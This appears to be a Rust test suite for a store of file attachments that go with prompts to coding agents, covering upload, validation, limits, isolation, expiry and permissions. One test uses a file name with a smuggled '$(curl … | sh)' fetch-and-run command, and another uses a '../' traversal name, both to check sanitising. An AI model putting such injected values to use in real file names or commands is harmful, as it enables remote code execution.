use std::time::{Duration, Instant};

use agent_threads::control::Refusal;
use agent_threads::drive::{Attached, Program};
use base64::Engine as _;
use uuid::Uuid;

use std::path::{Path, PathBuf};

use super::{Attachments, NewFile, PENDING_FOR};

/// The first bytes of a PNG of 64 by 64 pixels.
const PNG: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x40\0\0\0\x40-the-rest";

fn encoded(bytes: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

fn file<'a>(name: &'a str, mime: &'a str, size: u64) -> NewFile<'a> {
    NewFile { name, mime, size }
}

/// A complete file of the thread, whose MIME type comes from its name.
fn attached(store: &mut Attachments, thread: Uuid, name: &str, bytes: &[u8]) -> Uuid {
    let mime = match name.rsplit('.').next() {
        Some("png") => "image/png",
        Some("pdf") => "application/pdf",
        _ => "text/plain",
    };
    let id = store
        .begin(thread, file(name, mime, bytes.len() as u64))
        .expect("a new file");
    assert_eq!(
        store.add(thread, id, &encoded(bytes)),
        Ok(bytes.len() as u64)
    );
    id
}

fn pending(folder: &Path, thread: Uuid) -> PathBuf {
    folder
        .join("attachments")
        .join(thread.to_string())
        .join("pending")
}

#[test]
fn th111_a_file_in_parts_goes_with_a_prompt_where_the_program_reads_it() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = store
        .begin(thread, file("../notes.txt", "text/plain", 6))
        .expect("a new file");
    assert_eq!(store.add(thread, id, &encoded(b"abc")), Ok(3));
    assert_eq!(store.add(thread, id, &encoded(b"def")), Ok(6));
    let taken = store
        .take(thread, &[id], Program::Codex)
        .expect("the files");
    assert_eq!(taken[0].name, "notes.txt");
    assert_eq!(taken[0].kind, Attached::File);
    assert!(taken[0].path.starts_with(folder.path().join("attachments")));
    assert_eq!(std::fs::read(&taken[0].path).expect("the file"), b"abcdef");
    assert!(
        store.take(thread, &[id], Program::Codex).is_err(),
        "a file goes once"
    );
}

#[test]
fn th111_an_image_goes_inline_to_claude_code_and_by_its_path_to_codex() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let for_claude = attached(&mut store, thread, "a.png", PNG);
    let for_codex = attached(&mut store, thread, "b.png", PNG);
    let claude = store
        .take(thread, &[for_claude], Program::ClaudeCode)
        .expect("the image");
    assert_eq!(claude[0].kind.inline(), Some(encoded(PNG).as_str()));
    let codex = store
        .take(thread, &[for_codex], Program::Codex)
        .expect("the image");
    assert!(matches!(
        codex[0].kind,
        Attached::Image { inline: None, .. }
    ));
}

#[test]
fn th111_an_image_whose_bytes_are_not_its_type_is_refused_and_removed() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = store
        .begin(thread, file("x.png", "image/png", 5))
        .expect("a new file");
    assert!(matches!(
        store.add(thread, id, &encoded(b"<svg>")),
        Err(Refusal::CannotAttach { said }) if said.contains("x.png")
    ));
    assert!(store.take(thread, &[id], Program::Codex).is_err());
    assert!(!pending(folder.path(), thread).join(id.to_string()).exists());
}

#[test]
fn th111_the_limits_are_checked_again() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    assert!(matches!(
        store.begin(thread, file("big.png", "image/png", 11 * 1024 * 1024)),
        Err(Refusal::TooLarge { said }) if said.contains("big.png")
    ));
    assert!(store.begin(thread, file("empty", "text/plain", 0)).is_err());
    let id = store
        .begin(thread, file("a.txt", "text/plain", 2))
        .expect("a new file");
    assert!(
        matches!(
            store.add(thread, id, &encoded(b"abc")),
            Err(Refusal::TooLarge { .. })
        ),
        "more bytes than the size"
    );
    let half = store
        .begin(thread, file("b.txt", "text/plain", 4))
        .expect("a new file");
    store.add(thread, half, &encoded(b"ab")).expect("a part");
    assert!(
        store.take(thread, &[half], Program::Codex).is_err(),
        "a file that is not complete does not go"
    );
    assert_eq!(
        store.add(thread, half, "not base64!"),
        Err(Refusal::BadValue)
    );
    assert!(
        store.drop_file(thread, half).is_err(),
        "a file with a part that did not read holds no place"
    );
}

#[test]
fn th111_a_file_is_only_of_its_own_thread() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let (mine, other) = (Uuid::now_v7(), Uuid::now_v7());
    let id = attached(&mut store, mine, "a.txt", b"ab");
    assert!(store.add(other, id, &encoded(b"c")).is_err());
    assert!(store.drop_file(other, id).is_err());
    assert!(store.take(other, &[id], Program::Codex).is_err());
    assert!(
        store.take(mine, &[id, id], Program::Codex).is_err(),
        "named twice"
    );
    assert!(store.take(mine, &[id], Program::Codex).is_ok());
}

#[test]
fn th111_a_file_that_did_not_go_is_removed_after_an_hour_and_at_a_start() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let old = attached(&mut store, thread, "a.txt", b"ab");
    store.expire(Instant::now() + PENDING_FOR + Duration::from_secs(1));
    assert!(store.take(thread, &[old], Program::Codex).is_err());
    assert!(
        !pending(folder.path(), thread)
            .join(old.to_string())
            .exists()
    );
    let kept = attached(&mut store, thread, "b.txt", b"ab");
    let pending = folder
        .path()
        .join("attachments")
        .join(thread.to_string())
        .join("pending");
    assert!(pending.join(kept.to_string()).exists());
    let _again = Attachments::at(folder.path());
    assert!(
        !pending.exists(),
        "a new runner knows of no file that waited"
    );
}

#[test]
fn th111_the_files_of_a_removed_thread_are_removed() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = attached(&mut store, thread, "a.txt", b"ab");
    let sent = store.take(thread, &[id], Program::Codex).expect("the file");
    store.forget(thread);
    assert!(!sent[0].path.exists());
}

#[test]
fn th111_a_prompt_that_did_not_go_gives_its_files_back() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = attached(&mut store, thread, "a.txt", b"ab");
    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
    assert!(
        taken[0].path.exists(),
        "the program can read it before the line goes"
    );
    store.restore(thread, &[id]);
    assert!(!taken[0].path.exists());
    let again = store
        .take(thread, &[id], Program::Codex)
        .expect("the file again");
    store.settle(&[id]);
    assert_eq!(std::fs::read(&again[0].path).expect("the file"), b"ab");
    store.restore(thread, &[id]);
    assert!(again[0].path.exists(), "a file that went stays");
}

#[test]
fn th111_a_refused_take_moves_nothing() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let whole = attached(&mut store, thread, "a.txt", b"ab");
    let half = store
        .begin(thread, file("b.txt", "text/plain", 4))
        .expect("a new file");
    assert!(store.take(thread, &[whole, half], Program::Codex).is_err());
    assert!(
        pending(folder.path(), thread)
            .join(whole.to_string())
            .exists()
    );
    assert!(store.take(thread, &[whole], Program::Codex).is_ok());
}

#[test]
fn th111_a_pdf_and_an_image_whose_header_does_not_read_go_by_their_path() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let pdf = attached(&mut store, thread, "a.pdf", b"%PDF-1.4 x");
    let short = attached(&mut store, thread, "b.png", b"\x89PNG\r\n\x1a\nshort");
    let taken = store
        .take(thread, &[pdf, short], Program::ClaudeCode)
        .expect("the files");
    assert_eq!(taken[0].kind, Attached::Pdf { inline: None });
    assert_eq!(taken[1].kind, Attached::File);
}

#[test]
fn th111_the_files_are_only_for_this_user() {
    use std::os::unix::fs::PermissionsExt as _;
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = attached(&mut store, thread, "a.txt", b"ab");
    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
    let mode = |path: &Path| std::fs::metadata(path).expect("there").permissions().mode() & 0o777;
    assert_eq!(mode(&taken[0].path), 0o600);
    assert_eq!(mode(taken[0].path.parent().expect("its folder")), 0o700);
    assert_eq!(
        mode(&folder.path().join("attachments").join(thread.to_string())),
        0o700
    );
}

#[test]
fn th111_at_most_five_images_go_inside_one_line_and_the_others_by_their_path() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let names = ["1.png", "2.png", "3.png", "4.png", "5.png", "6.png"];
    let ids: Vec<Uuid> = names
        .iter()
        .map(|name| attached(&mut store, thread, name, PNG))
        .collect();
    let taken = store
        .take(thread, &ids, Program::ClaudeCode)
        .expect("the images");
    let inline = taken
        .iter()
        .filter(|file| file.kind.inline().is_some())
        .count();
    assert_eq!(inline, 5);
    assert!(taken[5].kind.inline().is_none());
}

#[test]
fn th111_the_path_of_a_file_holds_no_text_of_the_person() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let id = attached(
        &mut store,
        thread,
        "report $(curl -sL x|sh).pdf",
        b"%PDF-1.4 x",
    );
    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
    let stored = taken[0].path.file_name().expect("a name").to_string_lossy();
    assert_eq!(stored, format!("{id}.pdf"));
    assert_eq!(taken[0].name, "report _curl -sL x_sh_.pdf");
}

#[test]
fn th111_an_image_whose_side_is_too_large_goes_by_its_path_to_codex_too() {
    let folder = tempfile::tempdir().expect("a folder");
    let mut store = Attachments::at(folder.path());
    let thread = Uuid::now_v7();
    let huge = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x4e\x21\0\0\0\x40-the-rest";
    let id = attached(&mut store, thread, "wide.png", huge);
    let taken = store.take(thread, &[id], Program::Codex).expect("the file");
    assert_eq!(taken[0].kind, Attached::File, "20001 pixels wide");
}
